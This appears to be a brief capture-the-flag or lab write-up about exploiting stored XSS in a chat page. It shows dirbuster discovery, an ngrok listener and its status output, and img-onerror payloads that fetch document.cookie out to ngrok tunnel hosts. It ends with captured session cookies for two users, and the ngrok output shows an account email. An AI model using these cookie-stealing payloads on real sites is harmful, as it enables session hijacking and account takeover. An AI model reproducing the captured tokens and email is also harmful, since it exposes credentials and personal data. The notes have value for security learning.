## Observations
from dirbuster scans discovered a chat page which has an XSS
set up listener and forwarded it using ngrok

```bash                                                                                                                                                                                             
🛡️ Protect endpoints w/ IP Intelligence: https://ngrok.com/r/ipintel                                                                                                                           
                                                                                                                                                                                              
Session Status                online                                                                                                                                                          
Account                       sikurititaster@gmail.com (Plan: Free)                                                                                                                           
Version                       3.20.0                                                                                                                                                          
Region                        India (in)                                                                                                                                                      
Latency                       31ms                                                                                                                                                            
Web Interface                 http://127.0.0.1:4040                                                                                                                                           
Forwarding                    https://01d7-171-76-81-219.ngrok-free.app -> http://localhost:8000                                                                                              
                                                                                                                                                                                              
Connections                   ttl     opn     rt1     rt5     p50     p90                                                                                                                     
                              2       0       0.00    0.00    0.01    0.01     

```


## Payloads

```html
<img src=x onerror="alert(document.cookie)">

<img src=x onerror="alert(fetch('https://01d7-171-76-81-219.ngrok-free.app/?cookie='+document.cookie))">

<img src=x onerror="alert(fetch('https://hookworm-next-endlessly.ngrok-free.app?cookie='+document.cookie,{method:'GET',headers:{'ngrok-skip-browser-warning':'noobsek'}}))">



```

## Results

captured:
session=eyJ1c2VyIjp7ImlkIjoxLCJ1c2VybmFtZSI6IlJlbmF0YSJ9fQ.Z7lVVQ.yK04YK78bcD6TvFpqIc4cQAoT8I : Renata
session=eyJ1c2VyIjp7ImlkIjo1LCJ1c2VybmFtZSI6Im5vb2JzZWsxIn19.Z7lRpw.ZuhnyfFsQqhIElyxJvvicW8nK6Y : noobsek